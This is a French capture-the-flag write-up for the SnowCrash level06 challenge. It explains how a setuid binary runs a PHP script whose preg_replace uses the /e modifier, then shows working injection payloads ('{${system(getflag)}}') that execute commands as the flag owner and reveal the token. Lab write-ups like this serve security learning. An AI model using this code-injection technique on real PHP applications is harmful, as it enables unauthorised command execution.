#level06
## Observations

Nous disposons de deux fichiers à la racine:
- `level06.php`, qui a pour propriétaire `flag06`, et pour groupe `level06` (nous), nous avons les droits en lecture.
- `level06`, qui à le même proprietaire / groupe, nous  avons les droits de lecture et d'execution.

De plus, on s'aperçoit de la présence d'ACL pour `level06`, avec le `+` dans les permissions.
Un appel à `getfacl`, nous indique la présence du bit setuid `s`.
> Ainsi, le programme sera executé avec le propriétaire `flag06`.

En utilisant la commande `strings` sur le binaire, on peut supposer que ce binaire, 
execute le script php:
```
[^_]
/usr/bin/php
/home/user/level06/level06.php
;*2$"$
```

Comme dans les levels précédents, on va donc essayer d'injecter la commande `getflag`.

Observons le script PHP,
- Je le formatte grâce à [cet outil](http://www.phpformatter.com/)
- le code formatté est disponible en annexe.

Deux fonctions sont définies: `y($m)` et `x($y, $z)`

Le point d'entrée du programme sera (lignes 18-20):
```php
$r = x($argv[1], $argv[2]);

print $r;
```

Ce programme prendra ainsi deux arguments en lignes de commande.

Dans la fonction `x`, on définit une variable `$a`, prennant initialement comme
valeure le contenue d'un fichier, avec la fonction `file_get_contents`, le path du fichier
devra être spécifié dans le premier argument.

Nous avons ensuite une serie de regex, appliquées sur le contenu du fichier avec
la fonction PHP, `preg_replace`.

Preg_replace est utilisée avec l'option `\e`, qui a été [depréciée](https://www.php.net/manual/fr/function.preg-replace.php#refsect1-function.preg-replace-errors):
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

`\e` permet de remplacer l'element matché par une regex par le résultat d'une fonction PHP.
Par conséquent cette option présente des vulnérabilités que je pourrai exloiter par la suite.

Par ailleurs, cette fonction remplacera le résultat de le groupe n°2.

> Chaque groupe est définit par des paranthèses, ainsi:
    > Ainsi le groupe n°1 représente la regex: "\[x (.*)\]"
    > Le groupe 2 la regex: ".*" (qui designe tous les caractères possibles,
    autant de fois que l'on souhaite).

Il faut également noter que ce groupe matché sera pré-traité dans la fonction `y`,
et en regardant les regex de la fonction `y`, on notera, qu'un caractère '.' ou '@',
sera remplacé.


# Résolution

Après avoir cherché à exploiter la faille de sécurité, je suis tombé sur une méthode
sur le lien suivant:
http://php.net/manual/en/reference.pcre.pattern.modifiers.php

De plus il faut que la fonction php que l'on veut injecter match notre groupe de regex:
Ainsi le contenu de notre fichier devra resemblrer à:
```
[x <code_php_a_executer>]
```

J'essaie d'abord d'injecter une simple fonction `phpinfo()`:
```sh
level06@SnowCrash:~$ cat > /tmp/level06
[x {${phpinfo()}}]
level06@SnowCrash:~$ ./level06 /tmp/level06
phpinfo()
PHP Version => 5.3.10-1ubuntu3.19

System => Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686
Build Date => Jul  2 2015 15:04:38
Server API => Command Line Interface
Virtual Directory Support => disabled
[...]
```

Ca marche, j'essaie donc avec la fonction `système` de php, pour passer la commande
`getflag`:
```sh
level06@SnowCrash:~$ cat > /tmp/level06
[x {${system(getflag)}}]
level06@SnowCrash:~$ ./level06 /tmp/level06
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

J'obtiens mon flag, et je peux passer au level suivant :)
